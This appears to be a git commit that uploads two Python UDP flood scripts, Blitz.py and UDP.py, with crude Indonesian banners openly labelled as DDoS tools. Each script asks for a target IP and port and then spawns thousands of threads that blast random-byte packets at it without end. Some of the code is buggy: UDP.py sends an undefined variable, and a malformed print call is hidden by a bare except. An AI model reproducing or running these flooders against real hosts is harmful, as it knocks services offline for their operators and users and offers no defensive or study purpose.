6a651ffe051fa33087d9e3ed22cfc263ce11f3f5
Z4R13R <99081331+Zarier22@users.noreply.github.com>
2022-02-24 17:04:53 +0700

    Add files via upload

---
+++ Blitz.py
@@ -0,0 +1,30 @@
+import socket
+import random
+import threading
+import time
+import os , sys
+
+print ("\033[91m TOOLS H4N5 V2")
+print ("TIDAK MENJAMIN TEMBUS DI SERVER BESAR/BER ANTI DDOS.")
+print ("DONT ABUSE BROTHER!!")
+
+ip = str(input(" Ip :"))
+port = int(input(" Port :"))
+choice = str(input(" Gas? y/n :"))
+os.system("clear")
+def udp():
+	data = os.urandom(2626)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(75000):
+				s.sendto(data,addr)
+			print(+"\033[91m  Mengentod %s \\033[91m Dan memberi peju %s"%(ip,port))
+		except:
+			print("[H4N5] ATTACK TO %s PORT %s"%(ip,port))
+			
+for y in range(55000):
+    if choice == 'y':
+        th = threading.Thread(target = udp)
+        th.start()
---
+++ UDP.py
@@ -0,0 +1,31 @@
+import socket
+import threading
+import random
+import os
+import sys
+
+print ("\033[31mUDP TEST")
+print ("SIMPLE DDOS v2")
+print ("H4N5")
+print ("KALU GA TEMBUS YAUDAH KONTOL!!!")
+
+ip = str(input("IP :"))
+port = str(input("Port :"))
+choice = str(input("gas? :"))
+os.system("clear")
+def udp():
+	byte = os.urandom(20000)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(1000):
+				s.sendto(data,addr)
+			print(+"\033[91m  Mengentod %s \\033[91m Dan memberi peju %s"%(ip,port))
+		except:
+			print("[H4N5] ATTACK TO %s PORT %s"%(ip,port))
+			
+for y in range(1000):
+    if choice == 'y':
+        th = threading.Thread(target = udp)
+        th.start()
